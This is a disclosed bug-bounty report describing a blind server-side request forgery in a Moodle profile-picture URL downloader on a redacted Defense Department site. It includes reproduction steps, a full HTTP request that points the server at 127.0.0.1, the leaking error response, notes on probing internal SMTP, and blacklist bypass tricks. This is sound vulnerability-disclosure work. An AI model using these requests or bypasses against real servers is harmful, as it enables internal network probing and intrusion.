# Blind SSRF via image upload URL downloader on https://██████/ 

## Report Details
- **Report ID**: 1691501
- **URL**: https://hackerone.com/reports/1691501
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-09-05T14:26:08.852Z
- **Disclosed**: 2022-10-14T13:36:21.475Z

## Reporter
- **Username**: 696e746c6f6c
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
Dear DoD,

I found Blind SSRF on one domain from Hack US program.  Original domain is https://█████/ but when you make account and login it redirects you to https://███/my/. Here's the video PoC:

██████


Thank you!

## Impact

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. The attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.

## System Host(s)
███████

## Affected Product(s) and Version(s)
Web App is infected.

## CVE Numbers


## Steps to Reproduce
1. Create a one test account.
2. Login to that account.
3. Go to edit profile.
4. Scroll down there.
5. Notice user picture field.
6. Try to upload something.
7. You will see URL downloader.
8. Open your burp collaborator client.
9. Copy and paste the payload in URL downloader, make sure to include /test.png at the ending like this http://example.com/test.png
10. Poll now in burp collaborator client.
11. Notice HTTP and DNS interaction. IP address from HTTP interaction is from internal network which means
we can do some middleware issues. Notice that it's fetching test.png file. And IP is from internal network.
12. Turn your foxy proxy on and open your burp suite.
13. Paste this ipv4 in URL downloader: http://127.0.0.1/test.png
14. Intercept request. Request should look like this:
```javascript
POST /repository/repository_ajax.php?action=signin HTTP/1.1
Host: █████████
Cookie: MoodleSession=c5416a0e3ea3db1606b2876b0b6ac35f; RedirectDouble=1; MOODLEID1_=%25BA%2519V%25E8%25DA%2517
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 295
Origin: https://███████
Referer: https://█████/user/edit.php
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

file=http%3A%2F%2F127.0.0.1%2Ftest.png&repo_id=5&p=&page=&env=filemanager&accepted_types[]=.gif&accepted_types[]=.jpe&accepted_types[]=.jpeg&accepted_types[]=.jpg&accepted_types[]=.png&sesskey=h2ixtMF4Fv&client_id=6315fe93ef054&itemid=951353609&maxbytes=1073741824&areamaxbytes=-1&ctx_id=9398501
```
15. You will notice one error showing some info about server which confirms Blind SSRF again. The response looks like this:
```javascript
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 05 Sep 2022 14:05:32 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/7.4.28
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 20 Aug 1969 09:23:00 GMT
Last-Modified: Mon, 05 Sep 2022 14:05:32 GMT
Accept-Ranges: none
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 261

{"list":[],"nosearch":true,"norefresh":true,"nologin":true,"error":"HTTP\/1.1 404 Not Found\r\nServer: nginx\r\nDate: Mon, 05 Sep 2022 14:05:32 GMT\r\nContent-Type: text\/html; charset=utf-8\r\nContent-Length: 146\r\nConnection: keep-alive\r\n\r\n","repo_id":5
```
16. By the way if you change to 25 port its leaking something about Postfix SMTP server. 
17. Also I was able to identify that your web app is using libcurl.

## Suggested Mitigation/Remediation Actions
My suggestion is to create whitelisted domains in DNS
The easiest way to remediate SSRF is to whitelist any domain or address that your application accesses.
Blacklisting and regex have the same issue, someone will eventually find a way to exploit them
Do Not Send Raw Responses. Do not use blacklists. use whitelists (allow-lists)
Never send a raw response body from the server to the client. Responses that the client receives need to be expected.
Enforce URL Schemas. Allow only URL schemas that your application uses. There is no need to have ftp://, file:/// or even http:// enabled if you only use https://. And if you do use other schemas make sure that they’re only accessible from the part that needs to access them and not from anywhere else.
Enable Authentication on All Services. Make sure that authentication is enabled on any service that is running inside your network even if they don’t require it. Services like memcached, redis, mongo and others don’t require authentication for normal operations, but this means they can be exploited.
Sanitize and Validate Inputs. Never trust user input. Always sanitize any input that the user sends to your application. Remove bad characters, standardize input (double quotes instead of single quotes for example).After sanitization make sure to validate sanitized input to make sure nothing bad passed through.
Why is it Ineffective to Blacklist Domains and IPs? Understanding SSRF Bypass
One way to protect against SSRF is to blacklist certain domains and IP addresses. This defense technique is not effective, because hackers can use bypasses to avoid your security measures. Below are a few simple ways attackers can bypass blacklists.
Bypassing Blacklists Using HTTPS. Common blacklists blocking everything on port 80 or the http scheme. but the server will handle requests to 443 or https just fine. Instead of using http://127.0.0.1/ use: https://127.0.0.1/ https://localhost/
Or create SSRF protection with Bright.



## Attachments
No attachments
